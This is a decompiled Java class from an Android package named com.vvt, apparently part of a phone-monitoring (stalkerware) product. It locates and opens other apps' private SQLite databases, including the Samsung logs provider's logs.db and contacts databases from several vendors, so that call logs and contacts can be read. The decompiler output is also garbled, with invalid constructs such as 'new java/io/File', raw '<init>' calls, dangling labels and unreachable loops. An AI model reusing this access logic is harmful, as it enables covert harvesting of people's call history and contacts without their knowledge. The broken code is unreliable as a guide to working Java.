package com.vvt.h;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

public class e
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static String c = null;
  private static String d = null;
  
  private static SQLiteDatabase a(int paramInt, String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  private static SQLiteDatabase a(int paramInt, boolean paramBoolean)
  {
    boolean bool1;
    if (paramBoolean)
    {
      str = d;
      if (str == null)
      {
        str = a();
        d = str;
        bool1 = a;
        if (!bool1) {}
      }
    }
    if (!paramBoolean)
    {
      str = c;
      if (str == null)
      {
        str = b();
        c = str;
        bool1 = a;
        if (!bool1) {}
      }
    }
    if (paramBoolean) {}
    SQLiteDatabase localSQLiteDatabase;
    for (String str = d;; str = c)
    {
      localSQLiteDatabase = a(paramInt, str);
      int i = 5;
      while ((localSQLiteDatabase == null) && (i > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        localSQLiteDatabase = a(paramInt, str);
        i += -1;
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(boolean paramBoolean)
  {
    return a(17, paramBoolean);
  }
  
  private static String a()
  {
    String str1 = com.vvt.n.a.a("com.sec.android.provider.logsprovider");
    String str2;
    Object[] arrayOfObject;
    if (str1 != null)
    {
      str2 = "%s/%s";
      int i = 2;
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      int j = 1;
      String str3 = "logs.db";
      arrayOfObject[j] = str3;
    }
    for (str1 = String.format(str2, arrayOfObject);; str1 = b()) {
      return str1;
    }
  }
  
  private static String b()
  {
    String str1 = null;
    Object localObject1 = com.vvt.n.a.a("com.android.providers.contacts");
    if (localObject1 == null) {
      localObject1 = com.vvt.n.a.a("com.tmobile.myfaves");
    }
    if (localObject1 == null) {
      localObject1 = com.vvt.n.a.a("com.motorola.blur.providers.contacts");
    }
    for (Object localObject2 = localObject1;; localObject2 = localObject1)
    {
      boolean bool1 = a;
      if ((!bool1) || (localObject2 == null)) {
        return str1;
      }
      localObject1 = new java/io/File;
      ((File)localObject1).<init>((String)localObject2);
      label61:
      label73:
      Object localObject3;
      String str2;
      boolean bool2;
      if (localObject1 == null)
      {
        bool1 = false;
        localObject1 = null;
        if (localObject1 != null) {
          break label209;
        }
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        localObject3 = ((List)localObject1).iterator();
        do
        {
          do
          {
            bool1 = ((Iterator)localObject3).hasNext();
            if (!bool1) {
              break;
            }
            localObject1 = (String)((Iterator)localObject3).next();
            str2 = "contacts";
            bool2 = ((String)localObject1).startsWith(str2);
          } while (!bool2);
          str2 = ".db";
          bool2 = ((String)localObject1).endsWith(str2);
        } while (!bool2);
      }
      for (;;)
      {
        boolean bool3 = a;
        if ((bool3) && (localObject1 == null)) {
          break;
        }
        int i = 2;
        localObject3 = new Object[i];
        bool2 = false;
        str2 = null;
        localObject3[0] = localObject2;
        int j = 1;
        localObject3[j] = localObject1;
        str1 = String.format("%s/%s", (Object[])localObject3);
        bool1 = a;
        if (!bool1) {
          break;
        }
        break;
        localObject1 = ((File)localObject1).list();
        break label61;
        label209:
        localObject1 = Arrays.asList((Object[])localObject1);
        break label73;
        bool1 = false;
        localObject1 = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/AppEngine1/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */